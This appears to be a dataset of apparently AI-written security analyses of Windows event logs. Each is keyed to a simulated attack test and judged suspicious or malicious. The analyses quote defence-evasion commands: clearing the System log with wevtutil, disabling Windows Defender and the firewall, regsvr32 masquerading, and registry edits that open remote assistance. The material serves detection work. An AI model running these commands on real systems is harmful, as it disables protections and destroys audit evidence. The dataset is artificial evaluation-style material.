- **User Activity**: The user `SERVER002\\admin_test` is executing these processes with a high integrity level, suggesting this account has elevated privileges or is performing administrative-level tasks.

#### PowerShell Log Analysis
- **PowerShell Script Execution**: The execution of the command `Invoke-ATHRemoteFXvGPUDisablementCommand` appears in PowerShell logs and is executed by the `powershell.exe`. The specifics of this command should be scrutinized, as it doesn't align with standard PowerShell cmdlets and could potentially indicate a custom script or malicious intent, especially since this module or function is executing from a temporary path.

### Assessment
The behavior exhibited in these logs is suspicious:
- The frequent querying of user group memberships by the `CompatTelRunner.exe` is abnormal for its usual operation unless specifically being used for administrative oversight.
- Execution of non-standard PowerShell commands with potentially high privileges (`SeDebugPrivilege`) suggests potentially malicious behavior or at least a misuse of elevated access.

### Resolution
Given the details and nature of the logs, I conclude the findings as **SUSPICIOUS**. The activities do not conclusively indicate malicious intent, but they need further investigation to verify the legitimacy of the PowerShell command and the intent behind querying the group memberships. 

### Recommended Actions
1. **Investigate the `admin_test` account**: Determine if this account is necessary and verify the activities of any user associated with it.
2. **Analyze the PowerShell script `Invoke-ATHRemoteFXvGPUDisablementCommand`**: Investigate the origin, purpose, and legitimacy of this command.
3. **Review Privileges**: Ensure that the elevated privileges granted are necessary for the functioning of the required services and reduce unnecessary permissions.
4. **Monitor Subsequent Logins**: Pay particular attention to any future logons from the `admin_test` account or other suspicious user accounts on this machine."
Create Windows System File with powershell,"Throughout the provided logs, a series of events trigger on `SERVER002`, specifically involving the user `SERVER002\\admin_test` and the use of various Windows system utilities and PowerShell commands. Here's a detailed breakdown of the observed behavior:

### Analysis:

1. **Repeated Use of Command-Line Tools**:
   - Multiple instances of `cmd.exe` and `conhost.exe` are observed executing conditional existence checks and operations on temporary files (`data.txt`). The command lines indicate checks and data manipulation involving a temporary file. Although this could be legitimate (like scripts or automated tasks), the context in which these are executed remains unknown from the logs alone.

2. **Powesrhell Activity**:
   - The use of PowerShell to modify file attributes (specifically setting the 'System' attribute on `data.txt`) stands out. PowerShell, being a powerful tool, is often used legitimately in scripts but can be misused by attackers. The command implies an attempt to change file properties, which might aim to hide the file from regular file listings or system scans.

3. **Microsoft Edge Update Activity**:
   - Numerous logs highlight recurrent appearances of Microsoft Edge Update-related executables. Given updates are typically scheduled, their presence may not inherently indicate malicious activity. Particularly, `MicrosoftEdgeUpdate.exe` is executed under the `NT AUTHORITY\SYSTEM` account, confirming it runs with elevated privileges typical for update services.

4. **Event Viewer Utility Usage**:
   - Several executions of `wevtutil.exe` suggest interactions with event logs. This could be benign but may also suggest attempts to clear or export logs, potentially covering tracks after unauthorized activities.

5. **Miscellaneous Executions**:
   - Execution of `whoami` indicates a query likely by the user or process to verify user privileges or identity context.
   - The `hostname.exe` execution is typically benign, verifying system identities.

### Assessment:

- **Benign Elements**:
  - The logs related to standard Windows processes like `Microsoft Edge Update` activities, as they are expected within normal update procedures.

- **Suspicious Elements**:
  - Multiple batch and PowerShell scripts involving file checking and manipulation in temp directories, especially with commands setting system attributes. Such behavior without clear context could be an attempt to stage files or masking ongoing operations. 
  - Interaction with the event log utility `wevtutil.exe` may suggest attempts to alter logs, though without indications of log clearance or tampering, this remains speculative.

### Guidance:

1. **Deep Investigation Required**: 
   - The logs indicate activities that, while not confirmed as malicious, certainly are suspicious enough due to their context and the nature of operations. Thus, a deeper review of system changes, user activities, and the integrity of associated processes and files is recommended.

2. **Review User Activity**:
   - Investigate `SERVER002\\admin_test` actions particularly focusing on sessions around the log timestamps to determine if the command line entries were expected and legitimate.

3. **Check File Integrity**:
   - Evaluate logs and system events post these activities, determine if there are modifications or anomalies.

4. **Expand Monitoring**:
   - Implement enhanced monitoring for `PowerShell` and other scripting/interface tools, focusing on command-line capture and network activity involving this server.

### Conclusion:
Given the lack of explicit malicious behavior but the presence of suspicious activity patterns, the resolution would be: **SUSPICIOUS**. Further investigation is warranted to confirm the benign or malicious nature."
Clear Logs,"Upon analyzing the provided Windows event logs, several points of interest and potential concerns arose:

1. **Frequent Execution of Windows System Utilities**: 
    - Multiple instances of native Windows utilities such as `whoami.exe`, `hostname.exe`, `cmd.exe`, and particularly `wevtutil.exe` were executed in a short period of time:
      - Event `whoami.exe` and `hostname.exe` appear frequently, which might be used for reconnaissance activities.
      - Execution of `cmd.exe` with the command line `/c wevtutil cl System`. Clearing event logs with `wevtutil` is uncommon under normal operation and can indicate an attempt to cover tracks.

2. **Edge Update Activity**: 
    - The logs show several actions related to `MicrosoftEdgeUpdate.exe` including updates, registration actions (`/regsvc`, `/regserver`), and other operations. While most of these are legitimate system update activities, the high volume and variety of Edge processes being launched could warrant a closer examination considering the context or history of any potential misuse.
  
3. **Absence of Critical Security Logs**: 
    - There seems to be a lack of entries in the Security and System logs. This might suggest intentional log clearing, though there could also be technical issues with log collection.

### Assessment
- **Suspicious Behavior Detected**: The most notable suspicious activity is the execution of `cmd.exe` with a command that clears the System logs. This behavior commonly associates with malicious actors attempting to avoid detection. 

- **Need for Further Investigation**: The high rate of EdgeUpdate processes might need to be further correlated with any ongoing legitimate update sessions or compared against any historical baselines.

### Proceeding Steps
1. **Investigate the Source of Commands**: Identify who issued the `cmd.exe` command to clear logs. Checking user accounts, especially those with admin privileges, would be prudent.
2. **Correlate with Other Security Tools**: Check any alerts from EDR solutions to see if this behavior aligns with other detected anomalies or attacks.
3. **Monitor for Recurrence**: Set up further monitoring or alerts for sudden bursts of utility executions, especially those that clear logs.
4. **Review Update Processes**: Validate that all Microsoft Edge updates were legitimate and check update logs for anomalies.

### Resolution
Given the findings, the resolution is **SUSPICIOUS**. The logs contain tangible concerns which require additional context and possibly broader scope investigation before confirming or dismissing any malicious activity completely."
DLP Evasion via Sensitive Data in VBA Macro over email,"Analyzing the provided Windows event logs, we need to identify any indicators of potentially malicious activity, including unusual process executions, uncommon command-line arguments, and behaviors consistent with privilege escalation or lateral movement. Below is the analysis of the relevant log entries:

1. **Sysmon Events**:
   - Multiple `wevtutil.exe` and `conhost.exe` executions are recorded for the user `admin_test`. While `wevtutil.exe` is commonly used for log management, frequent execution in a short time span could indicate enumeration or log tampering attempts.
   - The use of `powershell.exe` with a `Send-MailMessage` command, attempting to send an email with a potentially sensitive attachment (`data-cc-macro.xlsm`), is highly suspicious. PowerShell is a powerful tool, often exploited to perform reconnaissance, execute scripts remotely, or exfiltrate data.
   - `whoami.exe` execution is typically benign but could also be used in reconnaissance activities to gather information about user privileges and domain membership.
   - High integrity levels are reported for `whoami.exe`, `conhost.exe`, and the PowerShell command, which means they are running with elevated privileges, raising the risk level when suspicious activities are detected.

2. **Windows PowerShell Logs**:
   - The PowerShell logs confirm the command execution to send an email with an attachment. This pattern is often associated with data exfiltration or reconnaissance during malicious activities.

3. **Security Logs**:
   - While most entries are related to failed credential activities concerning a `MicrosoftAccount`, there are no explicit signs here directly tying to a suspected attack vector, making it appear peripheral to the main issues identified.

4. **Risk Assessment**:
   - The presence and the pattern of `wevtutil.exe` and `powershell.exe` usage suggest that someone could be attempting to exfiltrate data or perform unauthorized access operations using the `admin_test` account.
   - The high integrity execution of these processes increases the risk, particularly with PowerShell being capable of a wide range of system modifications and remote interactions.

**Resolution**:
- **SUSPICIOUS**: The combination of tools and actions observed does not definitively confirm a malicious compromise but certainly embodies suspicious behavior that necessitates further investigation. The use of PowerShell for email transmission with attachments, combined with `wevtutil.exe` operations, prompts for deeper inquiry into the user activity, process lineage, and similar past activities. Immediate steps should include:
  - Verifying the legitimacy and authorized actions of the `admin_test` account.
  - Investigating the context and content of the email being sent, especially the attachment in question.
  - Reviewing access logs and previous system states for consistency and potential anomalies.
  - This account should be monitored more closely, and any unintended or unauthorized uses of PowerShell should be restricted or logged extensively.

These actions will help confirm whether this pattern of activities indicates benign operations or indeed signifies a prelude to or active malicious activity."
Rundll32 setupapi.dll Execution,"Upon analyzing the provided Sysmon logs, I have identified a series of events that suggest potential malicious activity. The analysis is detailed below:

### Analysis of Suspicious Activities

1. **Frequent Execution of System Utilities:**
   - Multiple instances of system utilities such as `PowerShell.exe`, `wevtutil.exe`, and `conhost.exe` being executed by the user `SERVER002\admin_test` stand out as unusual. Specifically, the repeated running of `wevtutil.exe` could indicate attempts to clear or manage event logs potentially to cover tracks of other activities.

2. **High Integrity Level Execution:**
   - Several processes, including `cmd.exe`, `PowerShell.exe`, and `rundll32.exe`, are executed with High integrity level. This suggests that they might be running with elevated privileges, which can be exploited for unauthorized access or control over system configurations.

3. **Use of `rundll32.exe` with Unusual Command:**
   - The command line argument for `cmd.exe` includes running `rundll32.exe` with `setupapi.dll` to execute potentially suspicious commands (`InstallHinfSection DefaultInstall 128 ...`). The use of `rundll32.exe` to load arbitrary DLLs is a known technique for executing malicious payloads covertly.

4. **Execution of `whoami.exe`:**
   - The usage of `whoami.exe` could indicate information gathering by an attacker to verify obtained access or to determine the currently logged-in user. It can often be a precursor to further attacks or data theft.

### Assessment and Risks

The Sysmon logs exhibit patterns often associated with malicious behavior, including the use of potentially unwanted commands and repeated execution of administrative tools that could indicate an attempt to evade detection or manipulate system logs.

1. **Persistence Mechanisms:**
   - The involvement of `rundll32.exe` suggests a possible attempt to maintain persistence in the system through an infected DLL or inf file method.
   
2. **Potential Data Exfiltration or Reconnaissance:**
   - Execution of reconnaissance tools like `whoami.exe` suggests information gathering, which might precede data exfiltration or lateral movement within the network.

### Guidance

Given the potentially malicious indicators identified in the logs, I recommend the following:

- **Immediate Incident Response:**
  - Isolate the affected machine from the network to prevent further potential compromise or data exfiltration.

Event Viewer Registry Modification - Redirection URL,"Based on the events from the logs provided for analysis, a detailed review identifies the following key observations:

1. **Sysmon Log Analysis:**
   - There are several instances of benign system processes being executed, including `whoami.exe`, `hostname.exe`, and `wevtutil.exe`. These processes appear to be running with a high integrity level by the user `admin_test`, which might relate to normal administrative tasks or checks.
   - The execution of `C:\\Windows\\System32\\cmd.exe` with a command modifying the registry to change the redirection URL for Event Viewer (`MicrosoftRedirectionURL`) raises a significant red flag. The command alters registry settings using the following command-line parameters:  
     `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""file://C:\\windows\\system32\\notepad.exe"" /f`.
   - It is uncommon and usually unnecessary to modify the Event Viewer redirection URL to launch Notepad.exe. This kind of registry manipulation could potentially be used in a persistence mechanism or to misdirect user actions.

2. **Edge Update Activity:**
   - Several entries reveal Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) being launched frequently. Such entries typically illustrate a normal update process, but the frequency and depth shown here should be noted for consistency with expected update cycles.

3. **Analysis of Behavior:**
   - The combination of high-integrity-level processes, particularly those involving command line registry manipulations, suggests potential unauthorized or malicious activity. The registry change is particularly concerning due to its capability to alter system behavior.

4. **Contextual Considerations:**
   - Beyond potential legitimate use, a registry change of this nature is not standard practice for regular operations and could indicate compromise aimed at disruption or misdirection.

### Conclusion

Given the presence of potentially harmful registry modification activity (`cmd.exe` related entry) alongside a range of normally benign operations, the logs should be characterized as **SUSPICIOUS**. The behavior evidences activity which requires further investigation to conclusively ascertain the intent and scope of potential compromise.

### Recommendations:

- **Immediate Action:** 
  - Conduct an in-depth analysis of the specific alteration to the Event Viewer registry entry to determine if the change is part of any malware tactic, technique, or procedure (TTP).
  - Review administrative processes and any scripted tasks on this system to validate authorized use corresponding to the observed cmd.exe activities.
- **Follow-up Steps:** 
  - Validate the integrity of the system and its files, particularly with respect to the Notepad.exe target.
  - Ensure there is a recovery plan to revert potentially unauthorized system changes while maintaining the readiness to respond to further indications of compromise."
Activate Windows NoFileMenu Group Policy Feature,"### Detailed Analysis:

#### Time Synchronization and Process Activity:
- **Event ID 4616 (Security Log)**, and associated Kernel General logs show changes in system time by the svchost.exe process. It's noteworthy that changing system time, especially if done improperly, can impact logging accuracy and potentially conceal unauthorized activity timelines. This behavior doesn't necessarily signify malicious actions, but it is uncommon and should be considered with other findings.

#### Privilege Escalation and Account Activity:
- **Event ID 4672 & 4624 (Security Log)** indicates the `admin_test` account logged in with extensive privileges (SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.), using NTLM authentication from a remote workstation (DESKTOP-3HL5B2P). While it could be legitimate admin activity, such broad privileges might attract exploitation attempts.

#### Registry Modification:
- **Sysmon Log**: A command (`cmd.exe` /c reg add ...) modifies the registry to disable the file menu in explorer. This command is executed by `cmd.exe` with `wsmprovhost.exe` as a parent process. This particular registry change can alter user interface settings silently, which is often associated with unwanted alterations for persistence or concealment of malicious activities.

#### Edge Update Activity:
- Various Sysmon logs show Microsoft Edge Update processes running multiple times with batch executions potentially related to updates or installations. This activity is consistent with software updating services but worth noting due to the elevated `SYSTEM` permissions—an attractive target for attackers looking to escalate privileges.

#### Process Execution:
- Numerous process executions of `conhost.exe`, `wevtutil.exe`, and `REG.exe` are observed. `wevtutil.exe` is part of the Windows Event Log service functioning, and frequent use of `wevtutil.exe` could indicate log manipulation attempts.

### Assessment of the Situation:
The logs provide a combination of legitimate activities that, under different circumstances or combined with other data points, could be attributed to malicious actions. Key points of suspicion include out-of-norm time adjustment, registry changes via command line, and high privilege allocation. However, without additional context or correlating incidents, these observations alone are insufficient to classify as definitely malicious.

### Threats or Risks Identified:
1. **Potential for System Time Manipulation**: Could indicate attempts to deceive forensic timelines.
2. **High Privilege Account Usage**: Legitimate but potentially misused or compromised.
3. **Registry Modification via Command Line**: Often utilized in malicious activity for persistence or stealth.

### Guidance and Next Steps:
1. Investigate the purpose and context around the `admin_test` login and privilege uses. Verify if legitimate and ensure best practices for privilege management.
2. Review registry changes against known baseline configurations to confirm if this change is expected or needed.
3. Confirm if time adjustments were authorized, and log integrity is uncompromised.
4. Review Microsoft Edge Update and other application/service update configurations and logs to ensure they are legitimate and processed correctly.

### Resolution: **SUSPICIOUS**
The combination of privileged account activity, registry edits, and time adjustments suggests potential for unwanted or unauthorized actions, warranting in-depth investigation to clear or address potential compromises before reaching a final verdict."
Modify EnableNonTPM Registry entry,"**Detailed Log Analysis:**

Upon reviewing the provided Sysmon logs, several observations stand out concerning potential suspicious activity:

1. **Persistent Process Creation:** 
   - A recurring pattern involves the execution of processes initiated by the user `admin_test` with high integrity levels, indicative of potential administrative privileges. Processes like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` are in frequent execution.
   - Frequent usage of `wevtutil.exe` can be considered suspicious since it is often used to manipulate event logs, an activity commonly associated with malicious intent to cover tracks.

2. **Command Line Execution:**
   - The command executed is notably suspicious: `""cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE"" /v EnableNonTPM /t REG_DWORD /d 1 /f`. This command modifies the system registry, potentially lowering security settings, such as enabling features without a TPM in this context (BitLocker).

3. **Use of Legitimate Tools for Potential Malicious Purposes:**
   - Tools like `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` are legitimate Windows utilities. However, when used in conjunction with rapid and automated registry modifications, it may suggest they are being utilized in a scripted or orchestrated attack scenario.

4. **Short Execution Span and Consistent User Context:**
   - These processes execute in a tight timeframe (within seconds), suggesting automated or scripted activities.
   - All processes are executed under the user `SERVER002\\admin_test`, which requires checking whether this user should have such extensive administrative privileges and whether such activities are expected for their role.

5. **Service and System Level Processes:**
   - System processes like `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe` are also recorded, but these appear related to standard operating procedures, such as software protection and Windows Management Instrumentation, without apparent modifications or suspicious parent activities.

6. **Hostname and Whoami Utilization:**
   - Executing utilities like `HOSTNAME.EXE` and `whoami.exe` can be part of reconnaissance, gathering environment information for further exploitation.

**Assessment:**

The pattern of activities observed in the logs conveys an orchestrated effort to possibly modify system settings and gather information, which is common in preparation for maintaining persistence or expanding an attack. The execution of registry modification commands without presence authorization or context is a strong indicator of compromise attempts, abuse of administrative privileges, or potentially unauthorized automated scripts.

**Resolution: SUSPICIOUS**

While no outright malicious software execution is evident, the activities are highly suspicious and unusual for a benign administrative task, especially given the registry modifications and consistent high-privilege operations.

**Guidance:**

1. **Immediate Actions:**
   - Suspend or restrict the `admin_test` account until further investigation is complete to prevent potential further exploitation.
   - Review and audit the use of administrative privileges associated with this account.
   - Implement monitoring for any additional execution of `wevtutil.exe` and suspicious modification commands related to system protection features such as BitLocker.

2. **Further Investigation:**
   - Investigate the origin of the commands and whether they match any known administrator activities or documented maintenance scripts.
   - Use Endpoint Detection and Response (EDR) tools to determine the full scope of activities executed from this account in the recent past.
   - Check for any other security events or alerts around the time of these activities that might provide context or show additional activity.

3. **Preventative Measures:**
   - Enhance logging and alerting on registry modifications, especially those related to security settings.
   - Review and ensure adherence to least privilege principles for accounts with administrative capabilities. 

These steps will help ascertain the legitimacy of the activities and safeguard against potential future incidents."

### Analysis of Logs:

1. **Suspicious Command Execution:**
   - The event log contains an entry for `cmd.exe` executing a command to stop and disable the Windows Defender service (`WinDefend`). This command: `sc stop WinDefend & sc config WinDefend start=disabled & sc query WinDefend` is extremely suspicious as disabling security services is a common tactic used by malware to prevent detection and removal.

2. **Service Control Operations:**
   - There are entries showing the Service Control Manager (`sc.exe`) being used to stop, disable, and query the status of the `WinDefend` service. Such operations are not typical for normal system use, especially when performed by an administrative account unless specifically performed for troubleshooting or maintenance operations by IT staff.

3. **Execution of Built-in Utility Tools:**
   - There's activity involving `wevtutil.exe`, `whoami.exe`, and `cmd.exe` under a user account `SERVER002\admin_test`. While the use of such utilities can be legitimate, the frequency and the context (particularly following the employment of the command to disable Windows Defender) are concerning.

4. **Frequent Edge Update Activities:**
   - Numerous entries relate to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) operations. While regular updates are normal, their overlap with suspicious service manipulations could be noteworthy but isn't overtly suspicious without corroborative evidence indicating tampering.

5. **Time Discrepancies:**
   - There are logs concerning time changes by `svchost.exe`, but they appear related to regular time synchronization activities rather than manual, unauthorized alterations.

6. **High Privilege Level Observed:**
   - Commands and processes are observed running with high integrity levels and under SYSTEM authority, which indicates administrative privilege. Such authority for certain processes especially regarding disabling security services is highly sensitive.

### Assessment:
Based on the evidence collected from the event logs, the disabling of Windows Defender is particularly concerning. The execution of `cmd.exe` to stop and disable this crucial security feature points toward activities that could compromise the host.

### Conclusion and Resolution:
Given these observations, the activity noted in these logs leads me to classify the behavior as **MALICIOUS**. There is sufficient evidence to suggest a potential security breach or unauthorized activity on this host.

### Recommendations:
- **Immediate Investigation and Remediation:**

Allow RDP Remote Assistance Feature,"Upon analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### System Log
- **Time Change Events**: The logs indicate that the system time was altered multiple times within a very short interval. Events from the `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` providers show time adjustments from `16:29:17.9589777` to `16:29:15.9489210` and similar, with `svchost.exe` being the responsible process. Time changes can be normal for synchronization purposes; however, frequent adjustments may need further review.

### Application Log
- **Software Protection Platform Service Event**: This event doesn't contain any concerning information and seems to be a regular log entry from the Software Protection Platform.

### Sysmon Log
- **Process Creation Events**: Several process creation events are recorded. Noteworthy processes include `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`, all running under the user `SERVER002\admin_test`. 
- **Potentially Unusual Command Execution**: The command `cmd.exe` is executed with arguments to modify registry settings related to Terminal Server:
  ```plaintext
  ""cmd.exe"" /c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
  ```
  This could imply a change to allow remote assistance without prompting, potentially opening unauthorized remote access, which is suspicious behavior if not performed within approved maintenance or change management.

### Security Log
- **Time Change Security Events**: These entries corroborate the time changes seen in the system log. The time changes are significant and should be understood in context as they could be indicative of malicious time manipulation if not justified by normal maintenance activities.

### Assessment
- **Time Synchronization**: While time changes may occur for synchronization, frequent and consecutive time alterations can be suspicious, especially when performed by common services like `svchost.exe`. This needs to be cross-referenced against company policies and potential alerts.
- **Remote Access Configuration Change**: The registry modification to the Terminal Server settings is suspicious, particularly without documented authorization or system maintenance records.

### Conclusion
Based on the analysis, there are activities that raise concerns primarily around unauthorized system modifications that could facilitate unauthorized remote access or indicate potential lateral movement preparations. Given the context of sensitive roles such as the CEO's machine involved, this requires more investigation.

### Resolution: SUSPICIOUS
- **Recommendations**:
  - **Further Investigation**: Conduct a more in-depth investigation to determine the legitimacy of the time changes and registry modification activities, including reviewing user activity logs and any corresponding network traffic.
  - **Immediate Actions**: Ensure that remote access policies on critical systems like the CEO's machine are secure and monitor for any unauthorized access.
  - **Review EDR Alerts**: Investigate further into the events leading to EDR alerts to clarify their context and potential threats.

Remove Network Share,"Upon examining the provided logs from the Windows host, here’s a detailed analysis of potential indicators of malicious activity:

### Security Logs
- **EventID 4616**: This event indicates a change in the system time. The change is minimal (an adjustment of milliseconds), potentially due to time synchronization. It's not inherently suspicious as time adjustments are common for time synchronization purposes.

### Sysmon Logs
- **Frequent Execution of System Utilities**: There are multiple executions of routine Windows system processes such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `net.exe`, `net1.exe`, and `whoami.exe`. These processes are generally legitimate, but they can be used by an attacker if automated without user interaction or with suspicious command-line arguments.
  
- **Specific Command Execution**:
  - **`cmd.exe` execution** with command line `""cmd.exe"" /c net share \\test\share /delete` suggests an attempt to delete a network share. This might be legitimate administrative activity, but if unexplained, it could suggest an attempt to disrupt network resource availability.
  
- **Parent Process**: The common parent process for these commands is `wsmprovhost.exe` with administrative privileges (`SERVER002\\admin_test`). The `wsmprovhost.exe` is associated with Windows Remote Management, which if not expected, could be an indication of remote administrative activities that require further scrutiny.

### Application Logs
- **Microsoft Edge Update Activities**: There are repeated entries for `MicrosoftEdgeUpdate.exe`, which appear to be normal update actions by the Microsoft Edge browser. The volume of these logs and their activities does not immediately suggest malicious behavior, but a compromised system could potentially misuse legitimate update binaries.

### System Logs
- **Time Synchronization**: The `Microsoft-Windows-Kernel-General` logs indicate some adjustments in system time. These are likely routine synchronizations with `time.windows.com` and appear to be benign.

### Assessment
- The pattern observed in the logs includes the execution of several system processes and commands that could be indications of either legitimate system administration or a misuse for malicious purposes. Key activities such as deletion of network shares and remote management might warrant more investigation to confirm their legitimacy.

### Recommendation
1. **Further Investigation**: Conduct a deeper analysis of the origin and authorization of the commands executed by `cmd.exe` and other system processes. Trace who initiated these actions and confirm if they align with expected user or IT activities.
2. **Audit User Actions**: Depending on company policy, review the logs or associated session data for the user `admin_test` to ensure these activities were authorized and necessary.
3. **Network Activity Review**: Check network logs for any unusual activity, especially related to the removed network share, which might indicate data exfiltration attempts.

### Conclusion
Given the observed activities and without more context on the administrative procedures, the analysis concludes:

**Resolution: SUSPICIOUS**

Further investigation is necessary to rule out any malicious intent behind these activities. Additional context and corroborative evidence from other monitoring solutions would help ascertain whether these are indeed a security incident or result from a legitimate administrative action."
Regsvr32 Registering Non DLL,"Upon reviewing the provided Sysmon and other Windows event logs, I have identified a series of activities on the CEO's machine that suggest potential malicious behavior or compromise. Below is the detailed analysis:

### Indicators of Potential Malicious Activity:

1. **Abuse of Regsvr32:**
   - There is a `cmd.exe` process running a script that seems to misuse `regsvr32.exe` to register a DLL with the wrong extension (converted from DLL to JPG). This typically suggests a file masquerading or living off the land binary script (LOLBin) attack, which is a common method to bypass security controls.

   ```
   CommandLine: ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg
   ```

2. **Potential File Masquerading:**
   - The activity involves copying `shell32.dll`, a legitimate system file, to a temporary directory and renaming it to `shell32.jpg`. This could indicate an attempt to disguise malicious activity as legitimate, possibly evading monitoring tools that neglect non-executable extensions.

   ```
   CommandLine: ""cmd.exe"" /c copy ""C:\Windows\System32\shell32.dll"" ""%temp%\shell32.jpg""
   ```

3. **Elevated Privilege Execution:**
   - The user 'SERVER002\\admin_test' executing these commands at a high integrity level suggests it might be exploiting administrative rights to run the suspicious commands. The use of high privileges along with the actions being taken raises a red flag.

4. **Suspicious Use of System Binaries:**
   - The logs include multiple executions of `wevtutil.exe` and `conhost.exe` associated with the same user, which can potentially be used to manage or alter event logs. This could be indicative of tampering with evidence of executed commands or attempting to delete traces of malicious activity.

### Assessment:

Given the sequence and nature of the events observed, there are strong indicators of suspicious and potentially malicious activity involving the misuse of native Windows tools (`cmd.exe`, `regsvr32.exe`, and others) to possibly execute unauthorized actions under the guise of legitimate administrative tasks. 

### Resolution:

MALICIOUS - The events captured show a clear pattern of LOLBins being misused to potentially execute unauthorized or harmful activities with escalated privileges. 

### Guidance:

1. **Immediate Containment and Investigation:**
   - Isolate the affected system (CEO's machine) from the network to prevent further potential harm or data exfiltration.
   - Gather additional logs or artifact data, including network logs, registry changes, and additional process creation logs for a deeper investigation.

2. **Conduct a Full Forensic Analysis:**
   - Perform a thorough forensic investigation on the system to identify potential further compromise or data affected.
   - Collect and analyze the memory dump to check for any in-memory artifacts.

   - Evaluate the security posture and monitoring capabilities to detect similar suspicious activities, ensuring security tooling is configured to alert on use of suspicious processes or LOLBins.
   - Implement additional endpoint security measures to prevent such misuse of administrative privileges and native tools. 

4. **User Awareness and Training:**
   - Conduct user training to recognize and report suspicious activities and clarify the correct usage of admin credentials and access permissions."
LockBit Black - Unusual Windows firewall registry modification -Powershell,"### Log Analysis

Upon examining the logs provided, I have identified some key insights and potential concerns:

1. **Process Execution and Command-Line Arguments:**
   - The Sysmon logs indicate multiple executions of processes such as `wevtutil.exe`, `conhost.exe`, and notably `powershell.exe`. The `powershell.exe` execution stands out because it carries a command line that modifies Windows Firewall policies:
     ```
     New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
     New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
     ```
     This command effectively disables the firewall, which is considered a significant security risk. Disabling the firewall without authorization could expose the machine to network threats.

2. **Privilege Escalation and Integrity Levels:**
   - The processes, including `powershell.exe`, are executed by the `SERVER002\admin_test` user with high integrity levels, indicating administrative privileges. This level of access could be exploited to make system-wide changes, as seen in the aforementioned PowerShell command.

3. **Multiple Service Stops:**
   - The logs show the `edgeupdate` service stopping twice. While updates to Edge can cause service stops and restarts, the timing and frequency should be evaluated further to ensure they align with expected update behavior.

4. **Frequent Executions of System Utilities:**
   - The use of system utilities like `wevtutil.exe` and `conhost.exe` can be typical in administrative contexts, but their repeated invocation warrants reviewing whether these actions align with routine maintenance or if they could indicate scripting activity to manipulate logs or masquerade processes.

### Assessment and Conclusion

- **Firewall Modification:** The disabling of the firewall via PowerShell is highly concerning and uncommon for regular administrative tasks, especially on a high-profile user's machine like the CEO's. This action suggests a possible malicious attempt to alter system defenses.

- **Service Behavior:** The stopping of services may coincide with legitimate update activities. However, without corroborative evidence of a planned update, these need a closer look.

Given the critical nature of the PowerShell activity and the potential for exploitation by a threat actor, this situation should be considered **MALICIOUS**. 

### Recommended Actions

1. **Immediate Security Controls:**
   - Re-enable the firewall and review its rules and policies.
   - Conduct a full malware and threat detection scan on the host using up-to-date EDR solutions.

2. **Incident Response and Investigation:**
   - Analyze how the PowerShell command was initiated, possibly through spear-phishing or misuse of credentials.
   - Review access and activity logs for `admin_test` and other accounts with elevated privileges to identify unauthorized access patterns.
   - Correlate the timings of the suspicious activities with any user-reported issues or other security alerts.

3. **Implement Preventative Measures:**
   - Restrict non-essential usage of PowerShell and sensitive system utilities.
   - Implement stricter Multi-Factor Authentication (MFA) for administrative tasks and access.
   - Consider deploying additional network and endpoint monitoring to quickly identify and respond to unauthorized changes. 

By addressing these concerns promptly, the organization can mitigate potential threats and protect sensitive assets from ongoing or future attacks."
Take ownership using takeown utility,"## Analysis of the Logs:

### Suspicious Activities Observed:

1. **Process Execution Patterns:**
   - There are multiple instances of command-line operations executed by `cmd.exe` that seem to be involved in modifying file ownership (`takeown.exe`). Commands like `/c mkdir %%temp%%\\data.001_takeown_folder` and `/c takeown.exe /f %%temp%%\\data.001_takeown_folder /r` suggest file/directory manipulation, which, while may be legitimate administrative tasks, could also be indicative of malicious behavior, especially if not expected or documented as part of normal workflow.

2. **Use of `takeown.exe`:**
   - The `takeown.exe` utility is used to take ownership of directories and files. The use of this command suggests an attempt to gain control over certain files or directories, a common tactic in lateral movement, privilege escalation, or preparation for unauthorized modifications.

3. **Multiple `conhost.exe` and `wevtutil.exe` Executions:**
   - The repetition of `conhost.exe` and `wevtutil.exe` spawning is peculiar. `wevtutil.exe` accesses the event log service, which can be associated with clearing logs or querying specific events without leaving a trace. However, no further indication is present to confirm such actions were taken maliciously.

4. **Time Alteration Events:**
   - The logged events involve alterations to system time, which can be a tactic used to manipulate log timelines, making forensic investigations challenging. However, these events show slight adjustments and do not conclusively indicate malicious timing attacks on their own.

### Benign Activities Observed:
- **Microsoft Edge Update Activities:**
  - There are a variety of events related to Microsoft Edge updates, which seem to be legitimate software maintenance activities, involving the execution and updating of Edge services (`MicrosoftEdgeUpdate.exe`). These events appear routine and not indicative of abuse or hijacking based on the available data.

### Considerations and Next Steps:

1. **Verification and Context:**
   - Confirm with system administrators or the user whether the usage of ownership commands (`takeown.exe`) aligns with routine maintenance or automation tasks on the CEO’s machine.
   - Cross-reference these logs with other data sources like DLP solutions or network logs to verify if any data was accessed or exfiltrated around the time these commands were executed.

2. **Monitoring and Review:**
   - Closely monitor any further usage of `takeown.exe` or similar administrative tools. Anomaly detection systems should flag unexpected alterations to system ownership settings.
   - Establish enhanced logging or alerting around processes and command-line executions, particularly those indicative of escalation attempts.

3. **Forensic Imaging and Analysis:**
   - If the benign intent of the file manipulations cannot be verified or if there are any indications of unauthorized access, consider performing a forensic analysis of the system to identify any potential indicators of compromise or backdoors.

### Final Assessment:
